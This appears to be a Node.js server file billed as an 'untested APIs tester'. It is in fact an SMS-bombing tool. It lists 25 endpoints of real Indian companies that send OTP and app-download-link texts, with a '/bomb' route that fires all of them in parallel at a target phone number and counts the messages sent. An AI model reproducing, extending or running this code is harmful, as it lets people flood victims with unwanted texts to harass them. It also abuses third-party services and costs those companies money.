// ============================================================
// api_server.js - UNTESTED APIs TESTER (25 APIs)
// Sirf test karne ke liye | 10min Cap | Logs
// ============================================================

const express = require('express');
const axios = require('axios');
const cors = require('cors');

const app = express();
app.use(cors());
app.use(express.json({ limit: '10mb' }));
app.use(express.urlencoded({ extended: true, limit: '10mb' }));

const MAX_DURATION_MIN = 10;
const BATCH_DELAY_MS = 100;

// ============================================================
// ===== 25 UNTESTED APIs =====
// ============================================================

const APIS = [
    // ============================================================
    // 🇮🇳 INDIAN APIs — Untested (25)
    // ============================================================
    {
        name: "Clamphook",
        url: "https://backend.clamphook.com/auth/register",
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "Origin": "https://clamphook.com",
            "Referer": "https://clamphook.com/"
        },
        data: (phone) => JSON.stringify({ mobile: "91-" + phone }),
        type: "sms"
    },
    {
        name: "AllenSolly",
        url: "https://www.allensolly.com/capillarylogin/validateMobileOrEMail",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "mobileoremail={phone}&name=markluther" },
        type: "sms"
    },
    {
        name: "Frotels",
        url: "https://www.frotels.com/appsendsms.php",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "mobno={phone}" },
        type: "sms"
    },
    {
        name: "Gapoon",
        url: "https://www.gapoon.com/userSignup",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "mobile={phone}&email=noreply@gmail.com&name=LexLuthor" },
        type: "sms"
    },
    {
        name: "Porter",
        url: "https://porter.in/restservice/send_app_link_sms",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "phone={phone}&referrer_string=&brand=porter" },
        type: "sms"
    },
    {
        name: "Cityflo",
        url: "https://cityflo.com/website-app-download-link-sms/",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "mobile_number={phone}" },
        type: "sms"
    },
    {
        name: "NNNow",
        url: "https://api.nnnow.com/d/api/appDownloadLink",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobileNumber: phone }),
        type: "sms"
    },
    {
        name: "Treebo",
        url: "https://www.treebo.com/api/v2/auth/login/otp/",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone_number: phone }),
        type: "sms"
    },
    {
        name: "Airtel",
        url: "https://www.airtel.in/referral-api/core/notify?messageId=map&rtn={phone}",
        method: "GET",
        headers: {},
        type: "sms"
    },
    {
        name: "MylesCars",
        url: "https://www.mylescars.com/usermanagements/chkContact",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "contactNo={phone}" },
        type: "sms"
    },
    {
        name: "Cashify",
        url: "https://www.cashify.in/api/cu01/v1/app-link?mn={phone}",
        method: "GET",
        headers: {},
        type: "sms"
    },
    {
        name: "KFC_IN",
        url: "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ AuthorizedFor: "3", phoneNumber: phone, Resend: "false" }),
        type: "sms"
    },
    {
        name: "IndiaLends",
        url: "https://indialends.com/internal/a/mobile-verification_v2.ashx",
        method: "POST",
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        data: { "_raw": "aeyder03teaeare=1&ertysvfj74sje=91&jfsdfu14hkgertd={phone}&lj80gertdfg=0" },
        type: "sms"
    },
    {
        name: "TPCash",
        url: "https://tpcash.site/api/ga-api/net_account/send?h5_ver=1.1.0&t=&net_mid=cpshare&phone=91{phone}",
        method: "GET",
        headers: {
            "user-agent": "okhttp/3.9.1"
        },
        type: "sms"
    },
    {
        name: "Meesho_New",
        url: "https://www.meesho.com/api/v1/user/login/request-otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone_number: phone }),
        type: "sms"
    },
    {
        name: "Tastes2Plate",
        url: "https://webapi.tastes2plate.com/app/new-login",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ device_token: "", mobile: phone, reffer_by: "", device_type: "web" }),
        type: "sms"
    },
    {
        name: "Tradgo",
        url: "https://tradgo.in/appapi4/Forgot_password_new/getOtp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobile: phone }),
        type: "sms"
    },
    {
        name: "Liquide",
        url: "https://api.v2.liquide.life/api/auth/checkNumber/+91{phone}?otpLogin=true",
        method: "GET",
        headers: {
            "user-agent": "okhttp/3.9.1"
        },
        type: "sms"
    },
    {
        name: "Samsung",
        url: "https://www.samsung.com/in/api/v1/sso/otp/init",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ user_id: phone }),
        type: "sms"
    },
    {
        name: "NykaaFashion",
        url: "https://www.nykaafashion.com/webscripts/api/otp/generate",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ customer_mobile: phone }),
        type: "sms"
    },
    {
        name: "RoyalChallengers",
        url: "https://shop.royalchallengers.com/api/customer/login",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ utype: "Online", mobile: phone, email: "" }),
        type: "sms"
    },
    {
        name: "Docon",
        url: "https://docon.co.in/api/v1/user/online-login",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ mobileNumber: phone }),
        type: "sms"
    },
    {
        name: "Dhurina",
        url: "https://intapi.dhurina.net/api/send_otp",
        method: "POST",
        headers: { "Content-Type": "application/json" },
        data: (phone) => JSON.stringify({ phone: phone }),
        type: "sms"
    },
    {
        name: "SmartCoin",
        url: "https://webapp.smartcoin.co.in/users/null/otpVerification/requestOtp/REGISTRATION/SMS?phoneNumber={phone}&name=null&device_id=null&android_id=c7abc1fd7459e84c&rooted=0&locale=en&app_instance_id=null&google_ad_id=d3ee50e2-c6ac-4ac5-9c14-6aff6b41c785&app_store_key=google_play_store&fcm_token=f_u1nGSLRQ2c2Cw_ZhmvpP&app_version=562&id_token=null&phone_number={phone}",
        method: "GET",
        headers: {
            "user-agent": "okhttp/3.9.1"
        },
        type: "sms"
    },
    {
        name: "UCO_Online",
        url: "https://apps.ucoonline.in/Lead_App/send_message.jsp?mob=&ref_no=&otpv=&appRefNo=&lgName=Test&lgAddress=Test&lgPincode=110001&lgState=DL&lgDistrict=NORTH+DELHI&lgBranch=0313&lgMobileno={phone}&lgEmail=test%40gmail.com&lgFacilities=CC&lgTentAmt=10000&lgRemarks=Test&declare_check=on&captchaRefno=123456&captchaResult=71&firstName=Test&password=Test%40123&requestType=SENDOTP&mobileNumber={phone}&login=test%40gmail.com&genderType=Male",
        method: "GET",
        headers: {
            "user-agent": "Mozilla/5.0 (Linux; Android 8.0; Pixel 2) AppleWebKit/537.36 Chrome/90.0.4430.93 Mobile Safari/537.36"
        },
        type: "sms"
    }
];

// ============================================================
// LOGGER
// ============================================================
function log(level, msg) {
    const time = new Date().toISOString();
    const emoji = { info: 'ℹ️ ', success: '✅', fail: '❌', warn: '⚠️ ', error: '🔥' }[level] || 'ℹ️ ';
    console.log(`${emoji} [${time}] ${msg}`);
}

// ============================================================
// API CALL FUNCTION
// ============================================================
async function makeApiCall(api, phone, retryCount = 0) {
    const startTime = Date.now();
    try {
        let url = api.url;
        if (typeof url === 'function') url = url(phone);
        else if (url.includes('{phone}')) url = url.replace(/{phone}/g, phone);

        const headers = { ...api.headers };
        delete headers['content-length'];
        delete headers['host'];

        let data = null;
        let isRaw = false;

        if (api.data) {
            if (typeof api.data === 'function') {
                data = api.data(phone);
            } else if (api.data._raw) {
                let rawData = api.data._raw;
                if (typeof rawData === 'string') rawData = rawData.replace(/{phone}/g, phone);
                data = rawData;
                isRaw = true;
            } else {
                data = JSON.parse(JSON.stringify(api.data));
                const replacePhone = (obj) => {
                    if (typeof obj === 'string') return obj.replace(/{phone}/g, phone);
                    if (Array.isArray(obj)) return obj.map(replacePhone);
                    if (typeof obj === 'object' && obj !== null) {
                        const newObj = {};
                        for (let key in obj) newObj[key] = replacePhone(obj[key]);
                        return newObj;
                    }
                    return obj;
                };
                data = replacePhone(data);
            }
        }

        const method = api.method.toLowerCase();
        const config = {
            method,
            url,
            headers,
            timeout: 5000,
            validateStatus: () => true
        };

        if (method === 'post' || method === 'put') {
            if (isRaw || typeof data === 'string') {
                config.data = data;
                if (typeof data === 'string' && data.includes('=') && !data.startsWith('{')) {
                    headers['Content-Type'] = 'application/x-www-form-urlencoded';
                }
            } else if (data) {
                config.data = JSON.stringify(data);
                if (!headers['Content-Type']) headers['Content-Type'] = 'application/json';
            }
        }

        const response = await axios(config);
        const responseTime = Date.now() - startTime;
        const success = response.status >= 200 && response.status < 400;
        return { status: response.status, success, responseTime };
    } catch (err) {
        const responseTime = Date.now() - startTime;
        if (retryCount < 1 && (err.code === 'ECONNRESET' || err.code === 'ETIMEDOUT')) {
            return makeApiCall(api, phone, retryCount + 1);
        }
        let statusCode = null;
        if (err.response) statusCode = err.response.status;
        return { status: statusCode, success: false, responseTime };
    }
}

// ============================================================
// ROUTES
// ============================================================
app.get('/', (req, res) => {
    res.json({
        status: 'ok',
        server: 'UNTESTED APIs TESTER',
        total_apis: APIS.length,
        uptime: process.uptime()
    });
});

app.get('/health', (req, res) => {
    res.json({ ready: true, apis: APIS.length });
});

// 🔥 TEST ROUTE
app.get('/test', async (req, res) => {
    const phone = req.query.phone || '7777885694';
    log('info', `🧪 TESTING ${APIS.length} APIs on ${phone}`);
    
    const results = [];
    for (const api of APIS) {
        const result = await makeApiCall(api, phone);
        results.push({ name: api.name, ...result });
        
        if (result.success) {
            log('success', `${api.name} → ${result.status} (${result.responseTime}ms)`);
        } else {
            log('fail', `${api.name} → ${result.status || 'FAIL'} (${result.responseTime}ms)`);
        }
        await new Promise(r => setTimeout(r, 100));
    }
    
    const working = results.filter(r => r.success).length;
    const failed = results.length - working;
    
    log('info', `✅ TEST COMPLETE | Working: ${working}/${results.length} | Failed: ${failed}`);
    
    res.json({
        phone,
        total: results.length,
        working,
        failed,
        results
    });
});

// 🔥 BOMB ROUTE (bot.js ke liye)
app.post('/bomb', async (req, res) => {
    const { phone, duration, instance } = req.body;
    
    if (!phone || phone.length !== 10) {
        return res.status(400).json({ error: 'Invalid phone' });
    }
    
    const effectiveDuration = Math.min(Number(duration) || 1, MAX_DURATION_MIN);
    log('info', `📱 Bombing ${phone} | Duration: ${effectiveDuration}min`);
    
    try {
        const startTime = Date.now();
        let success = 0, smsCount = 0;
        
        const shuffled = [...APIS].sort(() => Math.random() - 0.5);
        
        const results = await Promise.allSettled(
            shuffled.map(api => makeApiCall(api, phone))
        );
        
        for (let i = 0; i < results.length; i++) {
            const result = results[i];
            const api = shuffled[i];
            
            if (result.status === 'fulfilled' && result.value.success) {
                success++;
                smsCount++;
                log('success', `[${success}] ${api.name} → ${result.value.status} (${result.value.responseTime}ms)`);
            } else {
                const status = result.value?.status || 'FAIL';
                const rt = result.value?.responseTime || 0;
                log('fail', `${api.name} → ${status} (${rt}ms)`);
            }
        }
        
        const elapsed = (Date.now() - startTime) / 1000;
        log('info', `✅ Bombing done | Sent: ${success} | SMS: ${smsCount} | ${elapsed.toFixed(1)}s`);
        
        res.json({
            success: true,
            phone,
            effective_duration: effectiveDuration,
            totalSent: success,
            sms: smsCount,
            elapsed: elapsed.toFixed(1) + 's',
            total_apis: APIS.length
        });
    } catch (error) {
        log('error', 'Bombing error: ' + error.message);
        res.status(500).json({ error: error.message });
    }
});

app.get('/apis', (req, res) => {
    res.json({
        total: APIS.length,
        apis: APIS.map(a => a.name)
    });
});

// ============================================================
// START SERVER
// ============================================================
const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    log('success', `🚀 UNTESTED APIs TESTER running on port ${PORT}`);
    log('info', `📊 Total APIs: ${APIS.length}`);
    log('info', `🧪 Test Route: /test?phone=7777885694`);
    log('info', `💣 Bomb Route: /bomb (POST)`);
    log('info', `📋 APIs Route: /apis`);
});
